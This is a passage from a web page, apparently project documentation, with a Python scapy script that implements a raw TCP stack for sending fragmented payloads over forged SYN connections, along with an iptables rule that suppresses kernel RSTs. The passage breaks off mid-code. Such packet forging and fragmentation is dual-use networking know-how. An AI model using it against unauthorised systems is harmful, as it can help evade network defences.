<p>As a bonus, it also includes a semi-working TCP implementation written in pure scapy/python.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># -*- coding: UTF-8 -*-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Author: alex@supernetworks.org &lt;github.com/lts-rad&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">'''</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">Demo of TCP w/ sending fragmented payloads with scapy.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="display:inline-block;color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">Run this code inside of a namespace/container. Since Linux sends RST for forged SYN packets,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">this code will use iptables to block them.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="display:inline-block;color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">#&gt; iptables -A OUTPUT -p tcp --tcp-flags RST RST -s &lt;src_ip&gt; -j DROP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">'''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">all</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> logging</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger </span><span class="token operator">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">#logging.basicConfig(level=logging.DEBUG)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">#logger.setLevel(logging.DEBUG)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">TcpHandshake</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">object</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">RLoop</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">threading</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Thread</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            threading</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Thread</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp </span><span class="token operator">=</span><span class="token plain"> tcp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">handle_recv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> pkt </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">haslayer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">IP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">haslayer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0x3f</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0x12</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">   </span><span class="token comment" style="color:rgb(98, 114, 164)"># SYN+ACK</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"RCV: SYN+ACK"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_synack_ack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain">  pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">4</span><span class="token plain"> </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">      </span><span class="token comment" style="color:rgb(98, 114, 164)"># RST</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"RCV: RST"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token comment" style="color:rgb(98, 114, 164)">#raise Exception("RST")</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">abort </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0x1</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">     </span><span class="token comment" style="color:rgb(98, 114, 164)"># FIN</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"RCV: FIN"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_finack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">A</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># ACK came in?</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"RCV: ACK"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_base </span><span class="token operator">=</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"RCV: %s"</span><span class="token operator">%</span><span class="token builtin" style="color:rgb(189, 147, 249)">repr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Q </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_ack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token comment" style="color:rgb(98, 114, 164)">#great, got an ack, check the send queue for pending data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_queue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                        ret </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_queue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pop</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> ret </span><span class="token operator">==</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"? Unhandled packet"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            ans </span><span class="token operator">=</span><span class="token plain"> sniff</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">filter</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"tcp port %s"</span><span class="token operator">%</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">target</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> lfilter</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">tcp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">match_packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> prn</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">handle_recv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> store</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> target</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sport</span><span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">target </span><span class="token operator">=</span><span class="token plain"> target</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dst </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">next</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">iter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">Net</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">target</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dport </span><span class="token operator">=</span><span class="token plain"> target</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sport </span><span class="token operator">=</span><span class="token plain"> sport </span><span class="token comment" style="color:rgb(98, 114, 164)">#random.randrange(0, 2**16)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_start </span><span class="token operator">=</span><span class="token plain"> random</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">randrange</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token operator">**</span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># options=[('WScale', 7)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4 </span><span class="token operator">=</span><span class="token plain"> IP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">version</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">dst</span><span class="token operator">=</span><span class="token plain">target</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token operator">/</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">sport</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sport</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dport</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dport</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> flags</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                        seq</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_start</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> window</span><span class="token operator">=</span><span class="token number">65535</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">src </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">src</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Q </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">abort </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_base </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_window </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 